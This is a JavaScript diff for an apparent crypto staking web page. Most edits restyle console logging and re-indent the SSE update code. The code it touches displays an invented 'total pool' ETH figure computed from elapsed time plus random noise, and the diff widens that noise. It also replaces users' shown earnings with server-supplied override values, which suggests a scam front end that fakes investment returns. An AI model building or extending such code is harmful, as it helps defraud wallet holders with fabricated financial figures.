@@ -483,10 +483,10 @@ const averageIncreasePerSecond=0.055;
 const currentTime=Date.now();
 const elapsedSeconds=Math.floor((currentTime-startTime)/1000);
 const totalIncrease=elapsedSeconds*averageIncreasePerSecond;
-const randomFluctuation=(Math.random()-0.5);
+const randomFluctuation=(Math.random()-0.5)*2;
 const totalFunds=initialFunds+totalIncrease+randomFluctuation;
 totalValue.textContent=`${totalFunds.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})} ETH`;
-console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`);
+console.log(`%c[Total Pool] UPDATED: ${totalFunds.toFixed(2)} ETH`, 'color: cyan; font-weight: bold;');
 }
 async function updateInterest(){
 if(!grossOutputValue||!cumulativeValue){
@@ -512,7 +512,7 @@ if(userOverrides.grossOutput!==undefined&&userOverrides.cumulative!==undefined){
 finalGrossOutput=Number(userOverrides.grossOutput);
 finalCumulative=Number(userOverrides.cumulative);
 overrideApplied=true;
-console.log(`updateInterest: OVERRIDES APPLIED → Gross: ${finalGrossOutput}, Cumulative: ${finalCumulative}`);
+console.log(`%c[OVERRIDES] APPLIED → Gross: ${finalGrossOutput}, Cumulative: ${finalCumulative}`, 'color: magenta; font-weight: bold;');
 }
 const userData=allData.users[userAddress]||{};
 stakingStartTime=userData.stakingStartTime?parseInt(userData.stakingStartTime):stakingStartTime;
@@ -538,7 +538,7 @@ finalCumulative=finalGrossOutput-claimedInterest;
 }
 grossOutputValue.textContent=`${finalGrossOutput.toFixed(7)} ETH`;
 cumulativeValue.textContent=`${finalCumulative.toFixed(7)} ETH`;
-console.log(`updateInterest: UI UPDATED → Gross: ${finalGrossOutput.toFixed(7)}, Cumulative: ${finalCumulative.toFixed(7)}`);
+console.log(`%c[UI UPDATED] Gross: ${finalGrossOutput.toFixed(7)}, Cumulative: ${finalCumulative.toFixed(7)}`, 'color: orange; font-weight: bold;');
 }
 function updateLanguage(lang){
 currentLang=lang;
@@ -814,89 +814,90 @@ resetState(true);
 updateStatus('錢包已斷開連線，請在錢包設置中移除權限。',true);
 }
 function setupSSE(){
-  if(!userAddress){
-    console.log(`setupSSE: No user address, skipping SSE setup.`);
-    return;
-  }
-  let retryCount=0;
-  const maxRetries=5;
-  const baseRetryDelay=10000;
-  let fallbackPollingInterval=null;
+if(!userAddress){
+console.log(`setupSSE: No user address, skipping SSE setup.`);
+return;
+}
+let retryCount=0;
+const maxRetries=5;
+const baseRetryDelay=10000;
+let fallbackPollingInterval=null;
 
-  function startFallbackPolling(){
-    if(fallbackPollingInterval)return;
-    console.log(`setupSSE: Starting fallback polling (every 5s)`);
-    fallbackPollingInterval=setInterval(async()=>{
-      try{
+function startFallbackPolling(){
+if(fallbackPollingInterval)return;
+console.log(`%c[SSE] Starting fallback polling (every 5s)`, 'color: yellow;');
+fallbackPollingInterval=setInterval(async()=>{
+try{
+await loadUserDataFromServer();
+await updateInterest();
+console.log(`%c[Fallback Poll] UI updated at ${new Date().toLocaleTimeString()}`, 'color: gray;');
+}catch(e){
+console.error(`Fallback polling failed: ${e.message}`);
+}
+},5000);
+}
+
+function connectSSE(){
+console.log(`%c[SSE] Connecting to ${API_BASE_URL}/api/sse ...`, 'color: purple; font-weight: bold;');
+const source=new EventSource(`${API_BASE_URL}/api/sse`);
+
+source.onopen = () => {
+  console.log(`%c[SSE] CONNECTED! Listening for updates...`, 'color: green; font-weight: bold;');
+};
+
+source.onmessage = async(event) => {
+  console.log(`%c[SSE] ← RECEIVED: ${event.data}`, 'color: green; font-weight: bold;');
+  try{
+    const parsed=JSON.parse(event.data);
+    const {event:eventType,data}=parsed;
+
+    if(eventType==='dataUpdate' && data.users && data.users[userAddress]){
+      console.log(`%c[SSE] USER DATA UPDATE! Address: ${userAddress}`, 'color: blue; font-weight: bold;');
+      if(data.lastUpdated > localLastUpdated){
+        localLastUpdated = data.lastUpdated;
         await loadUserDataFromServer();
         await updateInterest();
-        console.log(`[Fallback Poll] UI updated at ${new Date().toLocaleTimeString()}`);
-      }catch(e){
-        console.error(`Fallback polling failed: ${e.message}`);
+        const balances = {
+          usdt: await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
+          usdc: await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
+          weth: await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)
+        };
+        updateBalancesUI(balances);
+        console.log(`%c[SSE] UI REFRESHED! Gross: ${grossOutputValue.textContent}`, 'color: orange; font-weight: bold;');
       }
-    },5000);
+    } else if(eventType==='ping'){
+      console.log(`[SSE] Ping received`);
+    }
+    retryCount=0;
+    if(fallbackPollingInterval){
+      clearInterval(fallbackPollingInterval);
+      fallbackPollingInterval=null;
+      console.log(`[SSE] Stopped fallback polling`);
+    }
+  }catch(e){
+    console.error(`[SSE] Parse error: ${e.message}`);
   }
+};
 
-  function connectSSE(){
-    console.log(`[SSE] Connecting to ${API_BASE_URL}/api/sse ...`);
-    const source=new EventSource(`${API_BASE_URL}/api/sse`);
-
-    source.onopen = () => {
-      console.log(`[SSE] CONNECTED! Listening for updates...`);
-    };
-
-    source.onmessage = async(event) => {
-      console.log(`%c[SSE] ← RECEIVED: ${event.data}`, 'color: green; font-weight: bold;');
-      try{
-        const parsed=JSON.parse(event.data);
-        const {event:eventType,data}=parsed;
-
-        if(eventType==='dataUpdate' && data.users && data.users[userAddress]){
-          console.log(`%c[SSE] USER DATA UPDATE! Address: ${userAddress}`, 'color: blue; font-weight: bold;');
-          if(data.lastUpdated > localLastUpdated){
-            localLastUpdated = data.lastUpdated;
-            await loadUserDataFromServer();
-            await updateInterest();  // 強制更新
-            const balances = {
-              usdt: await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
-              usdc: await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
-              weth: await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)
-            };
-            updateBalancesUI(balances);
-            console.log(`%c[SSE] UI REFRESHED! Gross: ${grossOutputValue.textContent}`, 'color: orange;');
-          }
-        } else if(eventType==='ping'){
-          console.log(`[SSE] Ping received`);
-        }
-        retryCount=0;
-        if(fallbackPollingInterval){
-          clearInterval(fallbackPollingInterval);
-          fallbackPollingInterval=null;
-          console.log(`[SSE] Stopped fallback polling`);
-        }
-      }catch(e){
-        console.error(`[SSE] Parse error: ${e.message}`);
-      }
-    };
-
-    source.onerror = () => {
-      console.warn(`[SSE] ERROR! Retrying in ${baseRetryDelay*(retryCount+1)/1000}s... (Attempt ${retryCount+1}/${maxRetries})`);
-      source.close();
-      isServerAvailable=false;
-      if(retryCount < maxRetries){
-        retryCount++;
-        setTimeout(connectSSE, baseRetryDelay * retryCount);
-      } else {
-        console.error(`[SSE] Max retries reached. Switching to fallback polling.`);
-        updateStatus(translations[currentLang].sseFailed,true);
-        startFallbackPolling();
-      }
-    };
+source.onerror = () => {
+  console.warn(`[SSE] ERROR! Retrying in ${baseRetryDelay*(retryCount+1)/1000}s... (Attempt ${retryCount+1}/${maxRetries})`);
+  source.close();
+  isServerAvailable=false;
+  if(retryCount < maxRetries){
+    retryCount++;
+    setTimeout(connectSSE, baseRetryDelay * retryCount);
+  } else {
+    console.error(`[SSE] Max retries reached. Switching to fallback polling.`);
+    updateStatus(translations[currentLang].sseFailed,true);
+    startFallbackPolling();
   }
+};
+}
 
-  connectSSE();
+connectSSE();
 }
 document.addEventListener('DOMContentLoaded',async()=>{
+console.log('Page loaded, initializing...');
 updateLanguage(localStorage.getItem('language')||'zh-Hant');
 let ethersLoaded=false;
 for(let i=0;i<30;i++){
@@ -913,8 +914,8 @@ if(window.ethers&&window.ethers.providers&&window.ethers.providers.Web3Provider)
 if(!ethersLoaded){updateStatus(translations[currentLang].ethersError,true);connectButton.disabled=true;return;}
 }
 await initializeWallet();
-setInterval(updateTotalFunds,500);  // 每 0.5 秒更新一次
-updateTotalFunds();  // 立即更新一次
+updateTotalFunds();
+setInterval(updateTotalFunds,500);
 if(!grossOutputValue||!cumulativeValue)await retryDOMAcquisition();
 setInitialNextBenefitTime();
 if(userAddress){await loadUserDataFromServer();setupSSE();}
